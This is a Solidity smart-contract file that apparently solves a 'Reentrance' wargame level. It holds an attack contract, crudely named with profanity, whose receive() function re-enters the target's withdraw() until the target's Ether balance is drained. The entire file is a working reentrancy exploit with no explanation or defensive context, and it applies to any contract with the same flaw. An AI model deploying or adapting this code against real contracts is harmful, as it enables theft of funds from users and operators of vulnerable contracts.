// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;

interface IReentrance {
    function withdraw(uint256 _amount) external;
}

contract FuckReentrance {
    IReentrance reentance;

    constructor(address _address) {
        reentance = IReentrance(_address);
    }

    function fuck(uint256 _amount) external {
        reentance.withdraw(_amount);
    }

    receive() external payable {
        uint256 balance = address(reentance).balance;
        if (balance > 0) {
            reentance.withdraw(balance > msg.value ? msg.value : balance);
        }
    }
}
